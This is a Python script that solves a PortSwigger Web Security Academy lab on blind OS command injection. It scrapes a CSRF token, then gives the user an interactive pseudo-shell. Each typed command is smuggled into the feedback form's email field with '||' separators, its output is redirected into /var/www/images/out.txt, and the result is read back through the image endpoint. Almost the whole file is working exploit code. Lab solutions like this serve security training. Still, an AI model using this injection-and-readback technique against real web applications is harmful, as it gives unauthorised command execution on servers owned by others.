import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind OS command injection with output redirection')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# Extraction of session and CSRF tokens needed for submitting malicious feedback.
r = requests.get('https://' + lab.id + '.web-security-academy.net/feedback')
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)

command = ''
while command != 'exit':
    command = input('$> ')
    # Data to send within the payload
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded', 
        'Cookie': f'session={r.cookies.get("session")}' 
        }

    data = {
        'csrf': f'{csrf}',
        'name': 'Command Injection',
        'email': f'asd||{command} > /var/www/images/out.txt||',
        'subject': 'Command Injection',
        'message': 'Command Injection'
    }
    # POST data and print the output of the command injected.
    try:
        requests.post('https://' + lab.id + '.web-security-academy.net/feedback/submit', headers=headers, data=data)
        print(requests.get('https://' + lab.id + '.web-security-academy.net/image?filename=out.txt').text)
        
    except Exception:
        print("An error occured.")
    # The lab asks the user to inject the 'whoami' command.
    if command == 'whoami' and '<p>Solved</p>' in requests.get('https://' + lab.id + '.web-security-academy.net/', data=data).text:
        print("Lab solved.")
        break
    print('Hint: enter command "whoami" to solve the challenge and exit the pseudoshell.\n')
